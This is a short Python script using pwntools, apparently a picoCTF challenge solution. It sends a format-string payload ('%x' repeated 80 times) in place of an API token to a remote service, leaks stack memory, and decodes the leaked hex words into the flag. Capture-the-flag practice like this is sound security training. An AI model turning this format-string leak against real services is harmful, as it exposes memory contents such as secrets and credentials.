from pwn import *
import re

# string to write to
s = ""

# open up remote connection
r = remote('mercury.picoctf.net', 59616)

# get to vulnerability
r.recvuntil("View my")
r.send("1\n")
r.recvuntil("What is your API token?\n")

# send string to print stack
r.send("%x" + ".%x"*80 + "\n")

# receive until the line we want
r.recvline()

# read in line
x = r.recvline()
print(x)

raw = x[:-1].decode()

raw = raw.split('.')

print(raw)

flag = ""
for c in raw:
    for i in range(4):
        a = chr((int(c,16) >> (8*i)) & 0xFF)
        if(ord(a) > 32 and ord(a) < 128):
            flag += a

print(flag)

print(re.search(r'picoCTF{.*}',flag).group(0))